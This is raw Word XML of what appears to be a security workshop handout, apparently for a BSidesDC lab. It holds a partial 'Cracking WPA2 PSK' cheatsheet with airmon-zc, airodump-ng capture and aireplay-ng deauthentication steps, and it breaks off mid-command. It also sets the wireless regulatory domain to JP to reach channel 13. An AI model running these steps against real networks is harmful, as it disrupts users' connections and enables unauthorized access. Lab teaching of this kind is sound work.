          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>stdin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4C5C22A6" w14:textId="77777777" w:rsidR="004C6465" w:rsidRDefault="004C6465" w:rsidP="003722F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:color w:val="787878"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21B27965" w14:textId="77777777" w:rsidR="004C6465" w:rsidRDefault="004C6465" w:rsidP="003722F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56E7EB29" w14:textId="77777777" w:rsidR="004C6465" w:rsidRDefault="004C6465" w:rsidP="003722F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="625117F5" w14:textId="22D123EE" w:rsidR="00F534DD" w:rsidRDefault="00FE3060" w:rsidP="003722F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Channel 13</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C11047E" w14:textId="77777777" w:rsidR="00F534DD" w:rsidRDefault="00F534DD" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13E64498" w14:textId="1B7ED584" w:rsidR="00F534DD" w:rsidRDefault="00FE3060" w:rsidP="00C14F90">
      <w:pPr>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w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F534DD" w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">get </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F534DD" w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>reg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="03E24780" w14:textId="77777777" w:rsidR="00F534DD" w:rsidRPr="00F534DD" w:rsidRDefault="00F534DD" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ADDA988" w14:textId="77777777" w:rsidR="00F534DD" w:rsidRDefault="00F534DD" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>iw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>reg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> JP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BD8A71" w14:textId="77777777" w:rsidR="00561527" w:rsidRDefault="00561527" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61C7FE91" w14:textId="77777777" w:rsidR="000F33A6" w:rsidRDefault="000F33A6" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6034696F" w14:textId="77777777" w:rsidR="00F477A7" w:rsidRDefault="00F477A7" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55BDC068" w14:textId="77777777" w:rsidR="00F477A7" w:rsidRDefault="00F477A7" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="327EA82F" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRDefault="00F573A9" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4006F48E" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRDefault="00F573A9" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5ED17960" w14:textId="77777777" w:rsidR="00A2052A" w:rsidRDefault="00A2052A" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="252A34CA" w14:textId="77777777" w:rsidR="00A2052A" w:rsidRDefault="00A2052A" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F37E5D9" w14:textId="77777777" w:rsidR="00A2052A" w:rsidRDefault="00A2052A" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E79A612" w14:textId="77777777" w:rsidR="00A2052A" w:rsidRDefault="00A2052A" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BE5047E" w14:textId="77777777" w:rsidR="00A2052A" w:rsidRDefault="00A2052A" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BEA044E" w14:textId="77777777" w:rsidR="00A2052A" w:rsidRDefault="00A2052A" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BB3F676" w14:textId="77777777" w:rsidR="00A2052A" w:rsidRDefault="00A2052A" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6202C357" w14:textId="77777777" w:rsidR="00A2052A" w:rsidRDefault="00A2052A" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F0CBC78" w14:textId="77777777" w:rsidR="00A2052A" w:rsidRDefault="00A2052A" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46A71598" w14:textId="77777777" w:rsidR="00A2052A" w:rsidRDefault="00A2052A" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58C1A464" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008274A1" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Cheatsheet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> Cracking WPA2 PSK </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CC6B4B"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First, put the card in monitor </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>mode :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="183CE35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airmon-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72EADBFE"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3706997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133AE76B"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airmon-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan0 6 </w:t>
      </w:r>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0DF"/>
      </w:r>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>channel 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CC9E48"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25E102A7"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Let’s find a wireless network that uses WPA2 / </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>PSK :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="442F99FC"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airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-regex BSIDESDC*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71331FCD"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
    <w:p w14:paraId="5157F1B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35E09EDF"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Stop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> and run it again, writing all packets to </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>disk :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="053B9CFE"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1565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon --channel 10 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:19:5B:52:AD:F7 -w /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0276CB" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08941E45" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3559EC59" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00E40A9F" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E40A9F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>DEAUTH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CCDD69" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">We need the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the AP (-a) and the mac of a connected client (-c)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F56DF22" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008274A1" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve">         Access Point</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:tab/>
        <w:t>Client</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BAFAF6"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1565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
